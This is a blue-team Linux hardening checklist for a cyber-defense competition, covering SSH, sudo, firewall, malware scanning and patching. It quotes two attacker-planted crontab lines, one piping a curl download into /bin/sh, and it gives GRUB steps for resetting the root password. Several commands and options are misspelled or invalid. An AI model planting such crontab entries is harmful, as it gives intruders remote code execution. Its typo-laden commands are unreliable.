___

```
Linux Kill Chain  
prepared by: Havi 
version: 1.1.0 (Oct 2026) 
references:  
	Mastering Linux Security and hardening -
	CCDC Kill Chain.pdf - prepared by Shawn 

```
___

## _Order of Importance:_   
1. ACCOUNT & SSH HARDENING
2. FIREWALL & NETWORK CONFIG
3. MALWARE REMOVAL
4. ADDITIONAL SYSTEM HARDENING
5. APPLICATION HARDENING
6. SYSTEM PATCHING
___

>_How to use this document:_  
>the document was written in markdown and is portable to many formats via a tool like pandoc (pandoc.org) obsidian 
>+ where applicable designed for copy and paste if available  
>+ unless you are confident in the environment, run commands using full path; `e.g. /bin/ls` vs `ls` if you are unsure about environment

___
### 1. ACCOUNT & SSH HARDENING
___

Login setup: "Safe" Environmental setup for initial work

```
export PATH=/bin:/sbin:/usr/bin:/usr/sbin
export EDITOR=nano  # optional if not comfortable with other editors
```

>you can validate these variables are set with the commands:  
>>`env | egrep 'EDITOR|PATH'`

Change passwords  
_as root:_

```
passwd root  # change root password first
passwd sysadmin # change other privileged accounts (e.g. sysadmin, administrator, etc.)
```

>#### KEEP THIS PASSWORD SECRET! KEEP IT SAFE! (until we lock root)

Create a working account `metro`:

```
groupadd -g 999999 metro
useradd -u 999999 -g 999999 -s/bin/bash -c"METRO" -m metro
passwd metro
visudo -f /etc/sudoers.d/metro
```

In the `/etc/sudoerd.d/metro` file add:

```
Defaults	secure_path = /bin:/sbin:/usr/bin:/usr/sbin
metro    ALL=(ALL:ALL) ALL
```

As root, become the `metro` to test `sudo` privileges:

```
su - metro
sudo -l
```

logout and login as `metro` to make sure the password is set.

Fix `metro` `$PATH`: (note: there may not be .bash_profile, or .profile)

```
mv ~/.profile ~/.profile.old
ln -s ~/.bash_profile ~/.profile
vi ~/.bash_profile
```

change PATH variable to "Safe":
`PATH=/bin:/sbin:/usr/bin:/usr/sbin`

add the EDITOR variable if you don't use vi
`EDITOR=nano`

save file and source it:
`source ~/.bash_profile`

If everything looks correct, and the password is set, it is ok to logout and back in
as `metro` user.

>#### From this point on we can and should use `sudo` as the user `metro` do your work on the system.

Now lock the root account (login as `metro` user):

```
sudo usermod -L root
```

(we can always set a new password if needed)

Inspect the `/etc/sudoers` and `/etc/sudoers.d/*` files.

```
sudo ls /etc/sudoers.d/*  # you should see /etc/sudoers.d/metro
sudo grep -v '^#' /etc/sudoers /etc/sudoers.d/* | less  
```

to modify the `sudoers` files:

```
sudo visudo -f /etc/sudoers  # look for suspicious accounts and adjust
sudo visudo -f /etc/suoders.d/<filename>  # look at each file here
```

>Groups in `sudoers` are prefixed with a `%` symbol. You should review them in   
>`/etc/group` for membership as any user in these groups can run `sudo` commands.  
>Also of interest are any entry with `NOPASSWD` as these users can run `sudo` without  
> being prompted for credentials. 

See who is already logged in and check `root`'s history:

```
who
last > ~/last_users.txt
sudo cat /root/.bash_history > ~/root_history.txt
chmod 600 ~/*.txt 
```

!!!INSPECT!!! `root`'s HIDDEN LOGIN FILES in /root/ for shenangians, look at:

```
sudo cat /root/.bashrc
sudo cat /root/.shrc
sudo cat /root/.cshrc
sudo cat /root/.tcshrc
sudo cat /root/.profile
sudo cat /root/.bash_profile
```
	
Make sure default group for root is root (gid 0)

```
sudo grep "^root:" /etc/passwd | awk -F: '{print $4}'
```
>result should be `0` (zero) IF IT IS NOT:

```
sudo usermod -g 0 root
```

>!!!LESSON LEARNED!!!  
>check `root`'s crontab for sketchy things:

```
sudo su - root
crontab -l
exit
```

>At the CCDC State Invitational
>in `root`'s crontab on the Debian BIND/NTP host we found:
>>`10 0 * * * bash 10.1.0.10 443`  

> We also found a malicious script runner in the CentOS7 EComm box  
>> `55 * * * * curl http://10.4.4.4/run | /bin/sh`  


System accounts (less than uid 1000). Investigate any account returned by this command:
_!!! MAKE SURE TO NOT LOCKOUT OUR ACCOUNT !!!_

```
sudo egrep -v "root|nologin|false|halt|shutdown|sync" /etc/passwd | \  
awk -F: '($3 <= 1000) {print}'  
```

>^^^this command (tested on Ubuntu) outputs all uids less than 1000 (which is the general system account range) that are not set with shells of nologin or false.

Any accounts with uid <1000 that are outputted should be locked via:

```
sudo usermod -L <username>
```

Non-system accounts. Investigate/lock these results.  
This command will check for non-system accounts:

```
sudo egrep -v "^\+" /etc/passwd | awk -F: '($3 >= 1000) {print}'
```

>!!!NOTE!!!  
>On the dovecot/sendmail/webmail server, they use local accounts.   
>You shouldn't lock these at it will impair function.  
>All of those users should be greater than uid 1000 and not be present in `/etc/sudoers`  
> or `/etc/sudoers.d/*` the only account you should adjust here is `Administrator`.

to lock a user's account:
`sudo usermod -L <user>`

Finally setup login banner to be used by SSH:

```
sudo touch /etc/metrobanner
sudo chmod 644 /etc/metrobanner
sudo chown root: /etc/metrobanner
sudo mv /etc/issue /etc/issue.orig
sudo mv /etc/motd /etc/motd.orig
sudo ln -s /etc/metrobanner /etc/issue
sudo ln -s /etc/metrobanner /etc/motd
sudo vi /etc/metrobanner
```

content of `/etc/metrobanner`:

```
UNAUTHORIZED ACCESS TO THIS DEVICE IS PROHIBITED  
  
You must have explicit, authorized permission to access or configure this device.
Unauthorized attempts and actions to access or use this system may result in civil
and/or criminal penalties. All activities performed on this device are logged and
monitored.  

```

___DNS___: check `/etc/resolv.conf` for phishy entries
```
sudo cat /etc/resolv.conf
```

___NTP__: check time and date  
`date` 
If you don't have NTP or chronyd (EL7+) installed you may need to install and configure it.
EL7+
```
sudo yum install chrony
sudo systemctl restart chronyd
sudo systemctl status chronyd
```

if not current time/date change it with `timedatectl` to set proper timezone (newer distros):
```
timedatctl set-timezone America/Chicago
```
OR link into place the appropriate zone file (older distros):
```
sudo cp /etc/localtime /root/old.timezone
sudo rm /etc/localtime
sudo ln -s /usr/share/zoneinfo/America/Chicago /etc/localtime
```

!!!LESSON LEARNED!!!
> at CCDC, the `splunk` host had "strange" DNS hosts defined in `/etc/resolv.conf`:  
```
nameserver 192.168.10.53
nameserver 192.168.10.153
```
Until DNS server `172.20.240.20` is setup use `nameserver 8.8.8.8`  
and remove/comment out anything else.


___SSH Setup___: this section will configure the `/etc/ssh/sshd_config` and the daemon.   
Port 22 will need to be opened in the firewall section.  
reference: https://www.digitalocean.com/community/tutorials/how-to-harden-openssh-on-ubuntu-18-04

backup the file:
`sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.prev`

adjust /etc/ssh/sshd_config file permissions:

```
sudo chown root:root /etc/ssh/sshd_config
sudo chmod 644 /etc/ssh/sshd_config
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.prev
```

lockdown the settings in /etc/ssh/sshd_config to match these:
> note the lines starting with `#` are commented out and represent defaults  
> so you will need to explicitly change them  
`sudo vi /etc/ssh/sshd_config`

```
PermitRootLogin no
PermitEmptyPasswords no
KerberosAuthentication no
GSSAPIAuthentication no
X11Forwarding no
MaxAuthTries 3
LoginGraceTime 20
PermitUserEnvironment no
AllowAgentForwarding no
AllowTcpForwarding no
PermitTunnel no
MaxSessions 2
Compression no
TCPKeepAlive no
UseDNS no
LogLevel VERBOSE
ClientMaxAliveCount 2
Banner /etc/metrobanner
DenyUsers metro@!172.20.240.0/22,*
```	

save the file and restart the service (depending upon OS):

```
sudo systemctl restart sshd
```

or (older non-systemd)

```
sudo service sshd restart
```
(it will error if there are problems with the settings)

Validate changes have taken effect via:

```
sudo sshd -T | less
```

___
### 2. FIREWALL & NETWORK CONFIG
___

_reminder:_  
+ what applications are running on your host?  
+ what ports (and protocols) do they need?  
+ what are the valid subnets of other hosts on the network?   
+ allow inbound only needed incoming ports and if possible specific IP addresses or subnets  
+ `DROP` all unauthorized connections  
+ allow outbound only what is needed   

Look for open network ports:

```
netstat -antup | less

#-or-#

ss -tulpan | less
```

>if ports are open and not related to an application, make note and block in firewall.

Determine state of the firewalls (use the command appropriate for your distro)

```
sudo /bin/firewall-cmd --state  # firewalld, EL distros
sudo /usr/sbin/ufw status  # ufw, debian/ubuntu distros
sudo /sbin/iptables -L  # most likely it will display other firewall settings
sudo /usr/sbin/nft list ruleset  # provided for information
```

Configure firewall, follow one of the sections appropriate to the system:

#### _firewalld_ (no for Ubuntu systems)
>Reference: https://www.redhat.com/sysadmin/beginners-guide-firewalld  
>Digital Ocean has a really good guide:  
>https://www.digitalocean.com/community/tutorials/how-to-set-up-a-firewall-using-firewalld-on-rocky-linux-8

>firewalld is zone based, get default and active zones

```
sudo /bin/firewall-cmd --get-default-zone
sudo /bin/firewall-cmd --get-active-zones
```

>Most likely a public zone is set, but not always; a note on firewalld zones:   
	drop = all incoming are dropped, outbound is allowed  
	block = same as drop but returns prohibited messages  
	public = untrusted networks, have to specify what you allow in  
	external = think outside interface for a DMZ, supports NAT masq  
	internal = think inside DMZ interface  
	dmz = isolated only certain connections allowed  
	
>The output will show what network interfaces are bound to what zone  
`default` zone is a catch-all  
if there isn't one set, or a weird one set you can change the default zone:

```
sudo /bin/firewall-cmd --set-default-zone=public
```

How to limit SSH to only the competition subnet:
```
sudo firewall-cmd --permanent --zone=public --remove-service=ssh
sudo firewall-cmd --permanent --zone=public \
--add-rich-rule='rule family=ipv4 source address=172.20.240.0/22 service name=ssh \
log prefix="SSH Logs" level="notice" accept'
sudo firewall-cmd --reload
sudo firewall-cmd --list-all --zone=public
```

Review the services set, remove any that aren't needed or used

```
sudo /bin/firewall-cmd --remove-service=<name of service from line>
sudo /bin/firewall-cmd --remove-service=cockpit
```

Remove any unsed ports or suspicious ports 
>!!! be wary of ones needed by the applicaiton(s)
add/remove ports via:

```
sudo /bin/firewall-cmd --remove-port=<port #>/<port type>
sudo /bin/firewall-cmd --add-port=<port #>/<port type>
```

#### !!!Save your changes periodically via:!!!

```
sudo /bin/firewall-cmd --runtime-to-permanent
```

>otherwise next system or firewall restart will revert to settings on disk

Validate changes: 

```
sudo firewall-cmd --list-all --zone=<zone>
```

Reload the firewall (refresh from disk)

```
sudo /bin/firewall-cmd --reload
````

>NOTE: firewalld can be used to block networks and subnets but that is more advanced  
and requires the use of rich-rules   
you can whitelist specific IPs via:

>`/bin/firewall-cmd --permanent --add-source=192.168.3.55/24`  
>to remove:  
>`/bin/firewall-cmd --permanent --remove-source=192.168.3.55/24`
	

#### _ufw For Ubuntu and debian_ No redhat
>Reference:  
https://www.digitalocean.com/community/tutorials/ufw-essentials-common-firewall-rules-and-commands

>ufw is default in Ubuntu OSes

Enable:

```
sudo /usr/sbin/ufw enable # check to see if active
sudo /usr/sbin/ufw status verbose # shows what is configured
```

>ufw has some app profiles defined so you don't need to know port numbers

```
sudo /usr/sbin/ufw app list
```

Configure loopback, not always required but good practice

```
sudo /usr/sbin/ufw allow in on lo
sudo /usr/sbin/ufw allow out on lo
sudo /usr/sbin/ufw deny in from 127.0.0.0/8  # ipv4
sudo /usr/sbin/ufw deny in from ::1  # ipv6
```

Review status numbered, this displays the rules with numbers  
showing what rule each config is, this is used for removing rules

```
sudo /usr/sbin/ufw status numbered
```

To remove a rule:

```
sudo /usr/sbin/ufw delete <num>  # matching number from status numbered

#-or-#

sudo /usr/sbin/ufw delete <specific rule>
sudo /usr/sbin/ufw delete allow from 199.0.11.2  # delete the specific rule whitelisted an IP
```

>ufw is simple but powerful, here are examples for common tasks

```
sudo /usr/sbin/ufw deny from 199.0.11.0/24 # block a subnets
sudo /usr/sbin/ufw deny in on eth0 from 199.0.11.2 # block a specific ip on interface eth0
sudo /usr/sbin/ufw allow from 199.0.11.2  # whitelist a specific IPs
sudo /usr/sbin/ufw allow from 199.0.11.2/24 proto tcp to any port 443
sudo /usr/sbin/ufw allow "Nginx Full"
```

To reload the firewall:

```
sudo /usr/sbin/ufw reload
```

#### _iptables_ - general
>Reference: 
https://www.digitalocean.com/community/tutorials/a-deep-dive-into-iptables-and-netfilter-architecture  
https://andreafortuna.org/2019/05/08/iptables-a-simple-cheatsheet/  
https://www.digitalocean.com/community/tutorials/iptables-essentials-common-firewall-rules-and-commands  
https://adamtheautomator.com/iptables-rules/  


>not as ideal as firewalld or ufw as persistence can be an issue if not setup right
>print out the cheatsheet and what you need to do will depend on the system
To view rules active:

```
sudo /sbin/iptables -L
```

To flush active rules:

```
sudo /sbin/iptables -F  # this effectively turns off iptables and creates an empty ruleset
```

Save off and adjust the `/etc/sysconfig/iptables` file (CentOS7):
`sudo cp /etc/sysconfig/iptables /etc/sysconfig/iptables.prev`

Wipe the rules and put this in place (note this is configured for `splunk`):
```
*filter
# Setting up a "deny all-accept all" policy
# Allow all outgoing, but deny/drop all incoming and forwarding traffic
:INPUT DROP [0:0]
:FORWARD DROP [0:0]
:OUTPUT ACCEPT [0:0]

# Custom per-protocol chains
# Defining custom rules for UDP protocol.
:UDP - [0:0]
# Defining custom rules for TCP protocol.
:TCP - [0:0]
# Defining custom rules for ICMP protocol.
:ICMP - [0:0]

# Accept SSH TCP traffic to subnet only
-A TCP -p tcp --dport 22 -s 172.20.240.0/22 -j ACCEPT

# allow established to talk
-A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
# allow loopback
-A INPUT -i lo -j ACCEPT

# splunk, uncomment if scoring engine is unhappy
-A TCP -p tcp --dport 8000 -j ACCEPT
#-A TCP -p tcp --dport 8089 -j ACCEPT
#-A UDP -p udp --dport 514 -s 172.20.24.0/22 -j ACCEPT 

# reject everything else
# bad match
-A INPUT -m conntrack --ctstate INVALID -j DROP
-A INPUT -p udp -m conntrack --ctstate NEW -j UDP
-A INPUT -p tcp --syn -m conntrack --ctstate NEW -j TCP
-A INPUT -p icmp -m conntrack --ctstate NEW -j ICMP

# reject anything
-A INPUT -p udp -j REJECT --reject-with icmp-port-unreachable
-A INPUT -p tcp -j REJECT --reject-with tcp-reset
-A INPUT -j REJECT --reject-with icmp-proto-unreachable
COMMIT
```


#### Network daemons

Disable non-secure communication paths:  

Remove telnet and FTP

```
systemctl --now mask ftpd  
systemctl --now mask tftpd

# debian/ubuntu
apt remove telnet ftp ftpd tftp talk talkd tftp tftpd

# EL
sudo yum remove telnet ftp tftp tftp-server
```

check `/etc/resolv.conf` to make sure the appropriate DNS servers are listed
>if they are not, to fix depends upon distro

UBUNTU specific:   
Network hardening adjsut settings in `/etc/sysctl.conf` to match these:

```
net.ipv4.ip_forward = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv4.icmp_ignore_bogus_error_responses = 1
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
net.ipv6.conf.lo.disable_ipv6 = 1
```

then run this command to reload the sysctl variables

```
sudo sysctl --system  
```

Check cron/at jobs for time bombs:

```
sudo su - 
cd /var/spool/cron/
ls
exit  # go back to `metro`
```

EL specific:  
Network hardening adjsut settings in /etc/sysctl.conf to match these:
```
net.ipv4.conf.all.accept_source_route=0
ipv4.conf.all.forwarding=0
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
net.ipv6.conf.lo.disable_ipv6 = 1
net.ipv4.conf.all.accept_redirects=0
net.ipv4.conf.all.secure_redirects=0
net.ipv4.conf.all.send_redirects=0
net.ipv4.conf.all.rp_filter=2
net.ipv4.icmp_echo_ignore_all = 0
```

then run this command to reload the sysctl variables

```
sudo sysctl --system  
```



#### At this point startup monitoring `tmux` sessions (as `metro` user)
`tmux` reference: https://tmuxcheatsheet.com/

Example Syslog monitoring:

```
tmux new -s syslog

# on EL systems
tail -f /var/log/secure 
ctrl+b d (detach from session)
```

to reconnect to the session:

```
tmux ls   # lists active session
tmux attach -t <id>  # connect to the id number of the session
```

___
### 3. MALWARE REMOVAL
___
UBUNTU:

If available, install `lynis` tool
> it appears available in the competition OS repositories `apt` sources  
> will need to install `epel-release` on EL distros first to get `lynis`


```
sudo lynis audit system
sudo /usr/sbin/chkrootkit
sudo /usr/bin/rkhunter -c
```
EL

```
sudo yum install epel-release
sudo yum install rkhunter lynis
sudo lynis audit system
sudo /usr/bin/rkhunter -c
```

___
### 4. ADDITIONAL SYSTEM HARDENING
___
>Reference: https://www.pluralsight.com/blog/it-ops/linux-hardening-secure-server-checklist

_!!!LESSON LEARNED!!!_  
Be sure to check `/etc/nsswitch.conf` for misconfiguration.

password policy enforcement:

+ on debian/ubuntu based
> add to `/etc/pam.d/common-password`
```
password required pam_cracklib.so try_first_pass retry=3 minlen=12 lcredit=1 ucredit=1 dcredit=2 ocredit=1 difok=2 reject_username
```

+ on EL based systems
> edit `/etc/security/pwquality.conf` and add at the bottom/change if present:
```
minlen=15
dcredit=-1
ucredit=-1
lcredit=-1
ocredit=-1
minclass=3
difok=8
```

System audit review:
> Review the log files generated in `3. MALWARE REMOVAL` section, specifically the `lynis`  
> tool logs (in `/var/log/lynis.log`) for issues. 



GENERAL LINUX  

Fix/ensure permissions on key files:  

fix cron

```
cd /etc
for f in anacrontab crontab cron.hourly cron.daily cron.weekly cron.monthly cron.d
do
sudo chown root:root ${f}
sudo chmod og-rwx ${f}
done
```

fix /etc/passwd, group and shadow

```
sudo chown root:root /etc/passwd
sudo chown root:root /etc/group
sudo chown root:root /etc/shadow
sudo chown root:root /etc/gshadow # if it exists
sudo chmod 644 /etc/passwd
sudo chmod 644 /etc/group
sudo chmod 600 /etc/shadow
sudo chmod 600 /etc/gshadow
```


secure the boot files

```
sudo chown root:root /etc/grub.conf
sudo chmod og-rwx /etc/grub.conf
```

Check for basic system configuration file poisoning  
Look for strange entries in:

```
/etc/hosts # anything here will usually take precedent over DNS
/etc/resolv.conf # may point to rogue DNS
/etc/nsswitch.conf 
```


___
### 5. APPLICATION HARDENING
___
This will greatly depend upon the application. General kill chain approach:  
1) Change any application account passwords at the OS level associated with the   
application. These should have been identified in the [1. Account Hardening] section.  
2) Change any in application administrative passwords.  
3) Review if the account has any roles such as ADMIN/POWER USER/SYS within itself or configs and remove these roles from non-application related accounts and users.  
4) Fix application install path ownership, for example:  
```
sudo chown -R splunk:splunk /opt/splunk
```

___
### 6. SYSTEM PATCHING
___

!!!THIS MAY BE OPTIONAL!!!  
> there is a potential to break the services provided by the scoring engine


Relevant files:  
EL based distros:
```
/etc/yum.repos.d/*
```
Ubuntu:
```
/etc/apt
```

To Patch an EL7 or earlier system:
```
sudo /bin/yum update
```
EL8+
```
sudo /bin/dnf update
```
Ubuntu/Debian (and other apt-based):
```
sudo /usr/bin/apt update ; sudo /usr/bin/apt upgrade
```

####!!!LESSON LEARNED!!!
>Reference: https://www.mark-gilbert.co.uk/fixing-yum-repos-on-centos-6-now-its-eol/  
>CentOS6 (what is used for the splunk host) has been End of Life (EoL) for years.  
>The system cannot patch, however it can be brought to  
>a state of patching as best as possible via:

```
cd /etc/yum.repos.d
sudo sed --in-place=.prev s/^mirrolist/\#mirrorlist/g CentOS-Base.repo
sudo sed --in-place s/^\#baseurl/baseurl/g CentOS-Base.repo
sudo sed --in-place s/mirror.centos.org/linuxsoft.cern.ch/g CentOS-Base.repo
sudo sed --in-place 's/\/centos\//\/centos-vault\//g' CentOS-Base.repo
sudo sed --in-place 's/\$releasever\//\/6.4\//g' CentOS-Base.repo
sudo yum clean all
sudo yum repolist
sudo yum update
```

___
### Information / Notes

Relevant/Useful Accounts/Files/Dirs:
+ Accounts and their locations

>`/etc/passwd`  
>`/etc/shadow`  
>`/etc/group`  
>`/etc/sudoers`  
>`/etc/sudoers.d/*`  
>`/etc/ssh/sshd_config`  
>
>Relevant commands: (for further info do '`man <command>`')  
>*!!! IMPORTANT !!!*  
>always use `which` to determine the proper path for these commands  
>as their PATH will vary by distro, sometimes in /bin, sometimes /usr/bin/passwd, etc. 
>
>CRITICAL Accounts:
>>root  
>>any account with uid 0  
>>any accounts/groups defined in sudoers or sudoers.d/*

+ General files and dirs

```
/etc/hosts # local host mappings
/etc/fstab # file systems and their configs
/etc/nsswitch.conf # used to configure name services switch
	## this defines where a system looks to auth users, 
	## lookup hosts, etc.
/etc/ntp.conf # used to configure network time
/etc/resolv.conf # used to define DNS servers to use
/etc/pam.d/*  # various configuration files for Pluggable Auth Module
```

EPEL can be installed on CentOS6 via (if `epel-release` isn't in Extras), have to have main repos fixed first:

```
sudo rpm -ivh https://archives.fedoraproject.org/pub/archive/epel/6/x86_64/epel-release-6-8.noarch.rpm  
cd /etc/yum.repos.d/  
sudo sed --in-place=.prev 's/^mirrorlist/\#mirrorlist/g' epel.repo  
sudo sed --in-place 's/^\#baseurl/baseurl/g' epel.repo  
sudo sed --in-place 's/download.fedoraproject.org\/pub/archives.fedoraproject.org\/pub\/archive/g' epel.repo
sudo yum repolist  
sudo yum install tmux lynis
```

>You could do `rpm -ivh https://dl.fedoraproject.org/pub/archive/epel/6/x86_64/epel-release-6-8.noarch.rpm`  
>however sometimes this might not work, depends on the version  
>of `rpm`.


Determine firewall solution available or running:
> EL7+ based distros = firewalld  
> EL6 or older = iptables  
> Debian/Ubuntu = ufw # you may need to install ufw on some debian systems

Firewall alternatives:
> If you don't have a firewall technology available some "old school" methods can be   tried including:  
`/etc/hosts.allow` and `/etc/hosts.deny`  
disabled and mask services (also part of system hardening)  
`/etc/hosts` setting up dummy entries  
NOTE: not all of this works, for example EL8+ systems no longer support `/etc/hosts.allow|.deny`  

How to break into a Linux distro if you lock the keys in the car so to speak:

All of these methods utilize the grub boot. On the screen where you get to choose  
the Linux distro and kernel to boot you often have to press `e` to edit the lines.   
From this point what you do is distro dependent.

On Enterprise Linux (7+):  

> Add the word `rd.break` to the end of the `linux` line. When the system boots   
> into the special environment. To change the `root` password then:  
```
mount -o rw,remount /sysroot  
chroot /sysroot  
passwd root  
touch /.auotrelabel
```

On Enterprise Linux (6 or earlier):  
> Add the word `single` to end of the `kernel` line:  
```
mount -o rw,remount /  
passwd root  
```

On Debian:  
> Similar to EL, edit the boot options with `e`, but at the end of the `linux`    
> add `init=/bin/bash` to the end of the line, then:    
```
mount -o rw,remount /    
passwd root    	
```

`init` and `service` script locations:
+ systemd based systems

```
/etc/systemd/system/*  # system related services
/etc/systemd/user/*  # userspace/defined services
/etc/grub/grub.cfg # bootloader config file
/etc/mail # sendmail config files
/etc/postfix # postfix mail server config
```

+ legacy/generic systems

```
/etc/init.d/  # where pre-systemd/legacy init scripts are located
/etc/rc.*/	# usage varies by distro
```


non-standard/custom software is often installed into:

```
/usr/local/bin
/opt
```

Useful commands:
>checking what files are provided by packages

```
sudo yum whatprovides <full path to command, process or file> # EL distros
sudo dpkg -S <filename>  # Debian distros
```

Basic steps (as `root` or prefixed with `sudo`):
>Know your system, most systems have a release file:

```
cat /etc/os-release
uname --kernel-release
uname -a
```

Packages:
UBUNTU
Look at installed packages:

```
sudo apt-cache pkgnames | less
# or #
sudo apt list --installed | less
```

remove un-necessary:

```
sudo apt remove <package name>
```

EL
Look at installed packages:

```
sudo yum list installed | less
```

remove un-necessary:

```
sudo yum remove <package name>
```

Services and Processes:
Turn off unused/unnecessary processes and services (will vary by OS):  
check the running process tables

```
ps -ef | less  # step through and note any process running as interactive users
```

For modern systems, turn off unnecessary services  
_TLDR version_

```
sudo systemctl --now mask <servicename>  # stops AND masks the service
```

with descriptions:

```
sudo systemctl status <servicename>  # query state of the service
sudo systemctl stop <servicename>  # stops service
sudo systemctl disable <servicename>  # disabled the service
sudo systemctl mask <servicename>  # prevents service from being restartable as it maps 
	# service file to /dev/null
```
	

For pre-systemd/non-systemd systems [RARE but still exploitable]:

```
sudo /etc/init.d/<servicename> stop  
#-or-#
sudo service <servicename> stop 
```

a quick command to lock all user accounts > uid 1000:

```
for u in $(sudo awk -F: '($3 >= 1000) {print $1}' /etc/passwd)
do sudo usermod -L ${u} ; done
```

Blocking ICMP packets on firewalld:  
```
sudo firewall-cmd --set-target=DROP --zone=public --permanent
sudo firewall-cmd -zone=public --remove-icmp-block={echo-request,echo-reply, \  
timestamp-request,timestamp-reply} --permanent
sudo firewall-cmd --reload
```

